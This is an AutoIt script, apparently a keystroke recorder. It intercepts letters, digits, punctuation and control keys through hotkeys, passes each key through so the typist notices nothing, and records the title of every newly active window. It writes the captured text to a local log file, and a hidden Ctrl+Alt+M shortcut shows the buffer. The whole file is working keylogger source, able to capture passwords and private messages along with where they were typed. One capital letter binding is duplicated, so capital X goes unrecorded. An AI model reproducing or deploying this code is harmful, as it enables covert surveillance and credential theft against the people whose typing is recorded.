
hotKeySets()
While 1
	Sleep(10)
	topWinMonitor()
	save()
WEnd

Func topWinMonitor()
	$curTopWinName = WinGetTitle("")
	If $curTopWinName == "" Or $topWinName == $curTopWinName Then
		Return
	EndIf
	$topWinName = $curTopWinName
;~ 	$isSomeKeyPressed = False
;~ 	If Not $isSomeKeyPressed Then
;~ 		Return
;~ 	EndIf
	$stroke = $stroke & @CRLF & $topWinName & @CRLF
EndFunc

Func save()
	$bufLen = StringLen($stroke)
	;TrayTip("KeyStrokeRecorder", "Buffer size: " & $bufLen, 20)
	If $bufLen < $MAX_BUFFER Then
		Return
	EndIf
	$n = FileWrite($fileHandle, $stroke)
	$stroke = ""
EndFunc

Func OnAutoItStart()
	Global Const $MAX_BUFFER = 512
	Global Const $FILE = "keyStrokeLog.Log"
	Global $stroke = ""
	Global $bufLen
	Global $fileHandle = FileOpen($FILE, 1)
	Global $topWinName = ""
	Global $curTopWinName
	Global $isSomeKeyPressed = False
EndFunc

Func OnAutoItExit()
	FileWrite($fileHandle, $stroke)
	FileClose($fileHandle)
EndFunc

Func hotKeySets()
	HotKeySet("^!m", "showStroke")
	
	HotKeySet("{SPACE}", "saveKeyStroke")
	HotKeySet("{BS}", "saveKeyStroke")
	HotKeySet("{ENTER}", "saveKeyStroke")
	HotKeySet("{tab}", "saveKeyStroke")
	HotKeySet("{end}", "saveKeyStroke")
	HotKeySet("{home}", "saveKeyStroke")
	HotKeySet("{esc}", "saveKeyStroke")
;~ 	HotKeySet("{LSHIFT}", "saveKeyStroke")
;~ 	HotKeySet("{RSHIFT}", "saveKeyStroke")
	
	HotKeySet("`", "saveKeyStroke")   ; `
	HotKeySet("+`", "saveKeyStroke")  ; ~
	HotKeySet("-", "saveKeyStroke")   ; -
	HotKeySet("+-", "saveKeyStroke")  ; _
	HotKeySet("=", "saveKeyStroke")   ; =
	HotKeySet("+=", "saveKeyStroke")  ; +
	HotKeySet("[", "saveKeyStroke")   ; [
	HotKeySet("+[", "saveKeyStroke")  ; {
	HotKeySet("]", "saveKeyStroke")   ; ]
	HotKeySet("+]", "saveKeyStroke")  ; }
	HotKeySet("\", "saveKeyStroke")   ; \
	HotKeySet("+\", "saveKeyStroke")  ; |
	HotKeySet(";", "saveKeyStroke")   ; ;
	HotKeySet("+;", "saveKeyStroke")  ; :
	HotKeySet("'", "saveKeyStroke")   ; '
	HotKeySet("+'", "saveKeyStroke")  ; "
	HotKeySet(",", "saveKeyStroke")   ; ,
	HotKeySet("+,", "saveKeyStroke")  ; <
	HotKeySet(".", "saveKeyStroke")   ; .
	HotKeySet("+.", "saveKeyStroke")  ; >
	HotKeySet("/", "saveKeyStroke")   ; /
	HotKeySet("+/", "saveKeyStroke")  ; ?
	
	HotKeySet("+1", "saveKeyStroke")  ; !
	HotKeySet("+2", "saveKeyStroke")  ; @
	HotKeySet("+3", "saveKeyStroke")  ; #
	HotKeySet("+4", "saveKeyStroke")  ; $
	HotKeySet("+5", "saveKeyStroke")  ; %
	HotKeySet("+6", "saveKeyStroke")  ; ^
	HotKeySet("+7", "saveKeyStroke")  ; &
	HotKeySet("+8", "saveKeyStroke")  ; *
	HotKeySet("+9", "saveKeyStroke")  ; (
	HotKeySet("+0", "saveKeyStroke")  ; )
	
	HotKeySet("1", "saveKeyStroke")
	HotKeySet("2", "saveKeyStroke")
	HotKeySet("3", "saveKeyStroke")
	HotKeySet("4", "saveKeyStroke")
	HotKeySet("5", "saveKeyStroke")
	HotKeySet("6", "saveKeyStroke")
	HotKeySet("7", "saveKeyStroke")
	HotKeySet("8", "saveKeyStroke")
	HotKeySet("9", "saveKeyStroke")
	HotKeySet("0", "saveKeyStroke")

	HotKeySet("a", "saveKeyStroke")
	HotKeySet("b", "saveKeyStroke")
	HotKeySet("c", "saveKeyStroke")
	HotKeySet("d", "saveKeyStroke")
	HotKeySet("e", "saveKeyStroke")
	HotKeySet("f", "saveKeyStroke")
	HotKeySet("g", "saveKeyStroke")
	HotKeySet("h", "saveKeyStroke")
	HotKeySet("i", "saveKeyStroke")
	HotKeySet("j", "saveKeyStroke")
	HotKeySet("k", "saveKeyStroke")
	HotKeySet("l", "saveKeyStroke")
	HotKeySet("m", "saveKeyStroke")
	HotKeySet("n", "saveKeyStroke")
	HotKeySet("o", "saveKeyStroke")
	HotKeySet("p", "saveKeyStroke")
	HotKeySet("q", "saveKeyStroke")
	HotKeySet("r", "saveKeyStroke")
	HotKeySet("s", "saveKeyStroke")
	HotKeySet("t", "saveKeyStroke")
	HotKeySet("u", "saveKeyStroke")
	HotKeySet("v", "saveKeyStroke")
	HotKeySet("w", "saveKeyStroke")
	HotKeySet("x", "saveKeyStroke")
	HotKeySet("y", "saveKeyStroke")
	HotKeySet("z", "saveKeyStroke")

;~ 	HotKeySet("+a", "saveKeyStroke")
;~ 	HotKeySet("+b", "saveKeyStroke")
;~ 	HotKeySet("+c", "saveKeyStroke")
;~ 	HotKeySet("+d", "saveKeyStroke")
;~ 	HotKeySet("+e", "saveKeyStroke")
;~ 	HotKeySet("+f", "saveKeyStroke")
;~ 	HotKeySet("+g", "saveKeyStroke")
;~ 	HotKeySet("+h", "saveKeyStroke")
;~ 	HotKeySet("+i", "saveKeyStroke")
;~ 	HotKeySet("+j", "saveKeyStroke")
;~ 	HotKeySet("+k", "saveKeyStroke")
;~ 	HotKeySet("+l", "saveKeyStroke")
;~ 	HotKeySet("+m", "saveKeyStroke")
;~ 	HotKeySet("+n", "saveKeyStroke")
;~ 	HotKeySet("+o", "saveKeyStroke")
;~ 	HotKeySet("+p", "saveKeyStroke")
;~ 	HotKeySet("+q", "saveKeyStroke")
;~ 	HotKeySet("+r", "saveKeyStroke")
;~ 	HotKeySet("+s", "saveKeyStroke")
;~ 	HotKeySet("+t", "saveKeyStroke")
;~ 	HotKeySet("+u", "saveKeyStroke")
;~ 	HotKeySet("+v", "saveKeyStroke")
;~ 	HotKeySet("+w", "saveKeyStroke")
;~ 	HotKeySet("+x", "saveKeyStroke")
;~ 	HotKeySet("+y", "saveKeyStroke")
;~ 	HotKeySet("+z", "saveKeyStroke")

	HotKeySet("A", "saveKeyStroke")
	HotKeySet("B", "saveKeyStroke")
	HotKeySet("C", "saveKeyStroke")
	HotKeySet("D", "saveKeyStroke")
	HotKeySet("E", "saveKeyStroke")
	HotKeySet("F", "saveKeyStroke")
	HotKeySet("G", "saveKeyStroke")
	HotKeySet("H", "saveKeyStroke")
	HotKeySet("I", "saveKeyStroke")
	HotKeySet("J", "saveKeyStroke")
	HotKeySet("K", "saveKeyStroke")
	HotKeySet("L", "saveKeyStroke")
	HotKeySet("M", "saveKeyStroke")
	HotKeySet("N", "saveKeyStroke")
	HotKeySet("O", "saveKeyStroke")
	HotKeySet("P", "saveKeyStroke")
	HotKeySet("Q", "saveKeyStroke")
	HotKeySet("R", "saveKeyStroke")
	HotKeySet("S", "saveKeyStroke")
	HotKeySet("T", "saveKeyStroke")
	HotKeySet("U", "saveKeyStroke")
	HotKeySet("V", "saveKeyStroke")
	HotKeySet("W", "saveKeyStroke")
	HotKeySet("S", "saveKeyStroke")
	HotKeySet("Y", "saveKeyStroke")
	HotKeySet("Z", "saveKeyStroke")
EndFunc

Func saveKeyStroke()
	;ConsoleWrite(@hotkeypressed)
	$stroke = $stroke & @hotkeypressed
	HotKeySet(@HotKeyPressed)
	Send(@hotkeypressed)
	HotKeySet(@HotKeyPressed, "saveKeyStroke")
EndFunc

Func showStroke()
	MsgBox(0, "Buffer:", $stroke)
EndFunc
